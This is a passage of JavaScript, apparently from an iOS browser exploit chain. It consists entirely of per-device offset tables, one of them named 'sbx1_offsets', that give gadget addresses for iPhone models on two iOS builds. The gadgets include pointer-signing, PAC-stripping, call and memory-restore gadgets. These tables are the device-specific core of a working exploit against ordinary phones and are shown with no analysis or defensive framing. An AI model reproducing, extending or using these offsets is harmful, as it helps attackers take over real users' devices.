      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x2625fc98cn,
      fcall_14_args_write_x8: 0x24ce88f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,1_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261ee098cn,
      fcall_14_args_write_x8: 0x24c76cf7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,2_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb112ecn,
      tcall_X0LG: 0x21eda5f24n,
      tcall_RLG: 0x20db52218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261ee098cn,
      fcall_14_args_write_x8: 0x24c76cf7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aefd4n,
      transformSurface_gadget: 0x20ff38970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,3_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261b3198cn,
      fcall_14_args_write_x8: 0x24c768f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,4_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb0d2ecn,
      tcall_X0LG: 0x21eda1f24n,
      tcall_RLG: 0x20db4e218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x261b3198cn,
      fcall_14_args_write_x8: 0x24c768f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7aafd4n,
      transformSurface_gadget: 0x20ff34970n,
      xpac_gadget: 0x1b63da15cn
   },
   "iPhone17,5_22E252": {
      malloc_restore_2_gadget: 0x1a96485d0n,
      dyld_signPointer_gadget: 0x1a96401e0n,
      malloc_restore_0_gadget: 0x18fd9628cn,
      malloc_restore_1_gadget: 0x1ca49c5c8n,
      malloc_restore_3_gadget: 0x190322cd4n,
      self_loop: 0x1900e4d9cn,
      tcall_CRLG: 0x23eb052ecn,
      tcall_X0LG: 0x21ed99f24n,
      tcall_RLG: 0x20db46218n,
      tcall_CSSG: 0x1ad451bbcn,
      tcall_DSSG: 0x1a9babc24n,
      tcall_DG: 0x1dffe9ff4n,
      _CFObjectCopyProperty: 0x18e5a94d8n,
      load_x1x3x8: 0x26189b98cn,
      fcall_14_args_write_x8: 0x24c760f7cn,
      _4_fcalls: 0x1c620fbf8n,
      jsvm_isNAN_fcall_gadget: 0x19e8cd95cn,
      jsvm_isNAN_fcall_gadget2: 0x1803b2524n,
      store_x0_x0: 0x19432c068n,
      mov_x0_x22: 0x19412f870n,
      str_x1_x2: 0x1e6668b50n,
      add_x22_0x90: 0x23a7a2fd4n,
      transformSurface_gadget: 0x20ff2c970n,
      xpac_gadget: 0x1b63da15cn
   }
};

    sbx1_offsets = {
   "iPhone11,2_4_6_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f2f82ecn,
      tcall_X0LG: 0x21f256150n,
      tcall_RLG: 0x20dfb6178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2612ca98cn,
      fcall_14_args_write_x8: 0x24cbe4054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23af8a02cn,
      transformSurface_gadget: 0x2103d4b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone11,8_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f2c42ecn,
      tcall_X0LG: 0x21f256150n,
      tcall_RLG: 0x20dfb6178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2612bd98cn,
      fcall_14_args_write_x8: 0x24cbb0054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23af5602cn,
      transformSurface_gadget: 0x2103d4b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone12,1_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f2c42ecn,
      tcall_X0LG: 0x21f256150n,
      tcall_RLG: 0x20dfb6178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2613ab98cn,
      fcall_14_args_write_x8: 0x24cbf8054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23af5602cn,
      transformSurface_gadget: 0x2103d4b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone12,3_5_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f2c42ecn,
      tcall_X0LG: 0x21f256150n,
      tcall_RLG: 0x20dfb6178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2613ab98cn,
      fcall_14_args_write_x8: 0x24cbf8054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23af5602cn,
      transformSurface_gadget: 0x2103d4b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone12,8_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f1d42ecn,
      tcall_X0LG: 0x21f24a150n,
      tcall_RLG: 0x20dfaa178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2612e298cn,
      fcall_14_args_write_x8: 0x24cb00054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ae6802cn,
      transformSurface_gadget: 0x2103c8b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone13,1_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0fe2ecn,
      tcall_X0LG: 0x21f26d150n,
      tcall_RLG: 0x20dfba178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x26164e98cn,
      fcall_14_args_write_x8: 0x24cdcf054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad9502cn,
      transformSurface_gadget: 0x2103d8b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone13,2_3_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f1022ecn,
      tcall_X0LG: 0x21f271150n,
      tcall_RLG: 0x20dfbe178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24cdd3054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad9902cn,
      transformSurface_gadget: 0x2103dcb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone13,4_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f1022ecn,
      tcall_X0LG: 0x21f271150n,
      tcall_RLG: 0x20dfbe178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2619ec98cn,
      fcall_14_args_write_x8: 0x24cdd3054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad9902cn,
      transformSurface_gadget: 0x2103dcb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,2_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0ce2ecn,
      tcall_X0LG: 0x21f275150n,
      tcall_RLG: 0x20dfc2178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261db298cn,
      fcall_14_args_write_x8: 0x24ce17054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad6502cn,
      transformSurface_gadget: 0x2103e0b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,3_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0ce2ecn,
      tcall_X0LG: 0x21f275150n,
      tcall_RLG: 0x20dfc2178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261db298cn,
      fcall_14_args_write_x8: 0x24ce17054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad6502cn,
      transformSurface_gadget: 0x2103e0b70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,4_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0ca2ecn,
      tcall_X0LG: 0x21f271150n,
      tcall_RLG: 0x20dfbe178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261a1498cn,
      fcall_14_args_write_x8: 0x24ce13054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad6102cn,
      transformSurface_gadget: 0x2103dcb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,5_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0ca2ecn,
      tcall_X0LG: 0x21f271150n,
      tcall_RLG: 0x20dfbe178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261a1498cn,
      fcall_14_args_write_x8: 0x24ce13054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad6102cn,
      transformSurface_gadget: 0x2103dcb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,6_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0362ecn,
      tcall_X0LG: 0x21f261150n,
      tcall_RLG: 0x20dfae178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x2619af98cn,
      fcall_14_args_write_x8: 0x24cd77054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23accd02cn,
      transformSurface_gadget: 0x2103ccb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,7_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0da2ecn,
      tcall_X0LG: 0x21f281150n,
      tcall_RLG: 0x20dfce178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261dcc98cn,
      fcall_14_args_write_x8: 0x24ce23054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad7102cn,
      transformSurface_gadget: 0x2103ecb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone14,8_22F76": {
      malloc_restore_2_gadget: 0x1a9a3b6c8n,
      dyld_signPointer_gadget: 0x1a9a6d0a4n,
      malloc_restore_0_gadget: 0x18fdaf28cn,
      malloc_restore_1_gadget: 0x1caa9d5c8n,
      malloc_restore_3_gadget: 0x19033cd18n,
      self_loop: 0x1900efd38n,
      tcall_CRLG: 0x23f0da2ecn,
      tcall_X0LG: 0x21f281150n,
      tcall_RLG: 0x20dfce178n,
      tcall_CSSG: 0x1ad86ac3cn,
      tcall_DSSG: 0x1a9fb7b10n,
      tcall_DG: 0x1e06543f8n,
      _CFObjectCopyProperty: 0x18e5b6554n,
      load_x1x3x8: 0x261dcc98cn,
      fcall_14_args_write_x8: 0x24ce23054n,
      _4_fcalls: 0x1c6688bf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecaca60n,
      jsvm_isNAN_fcall_gadget2: 0x1803ae9a0n,
      store_x0_x0: 0x19434f3f4n,
      mov_x0_x22: 0x19415286cn,
      str_x1_x2: 0x1e6ce5b00n,
      add_x22_0x90: 0x23ad7102cn,
      transformSurface_gadget: 0x2103ecb70n,
      xpac_gadget: 0x1b6838a08n
   },
   "iPhone15,2_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x2621c198cn,
      fcall_14_args_write_x8: 0x24ce6c054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone15,3_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x2621c198cn,
      fcall_14_args_write_x8: 0x24ce6c054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone15,4_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x261e6698cn,
      fcall_14_args_write_x8: 0x24ce6c054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone15,5_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f289150n,
      tcall_RLG: 0x20dfd6178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x261e6698cn,
      fcall_14_args_write_x8: 0x24ce6c054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
      store_x0_x0: 0x1943533f4n,
      mov_x0_x22: 0x19415686cn,
      str_x1_x2: 0x1e6ce9b00n,
      add_x22_0x90: 0x23adb902cn,
      transformSurface_gadget: 0x2103f4b70n,
      xpac_gadget: 0x1b683ca08n
   },
   "iPhone16,1_22F76": {
      malloc_restore_2_gadget: 0x1a9a3f6c8n,
      dyld_signPointer_gadget: 0x1a9a710a4n,
      malloc_restore_0_gadget: 0x18fdb328cn,
      malloc_restore_1_gadget: 0x1caaa15c8n,
      malloc_restore_3_gadget: 0x190340d18n,
      self_loop: 0x1900f3d38n,
      tcall_CRLG: 0x23f1202ecn,
      tcall_X0LG: 0x21f28d150n,
      tcall_RLG: 0x20dfda178n,
      tcall_CSSG: 0x1ad86ec3cn,
      tcall_DSSG: 0x1a9fbbb10n,
      tcall_DG: 0x1e06583f8n,
      _CFObjectCopyProperty: 0x18e5ba554n,
      load_x1x3x8: 0x2629b198cn,
      fcall_14_args_write_x8: 0x24d60b054n,
      _4_fcalls: 0x1c668cbf8n,
      jsvm_isNAN_fcall_gadget: 0x19ecb0a60n,
      jsvm_isNAN_fcall_gadget2: 0x1803b29a0n,
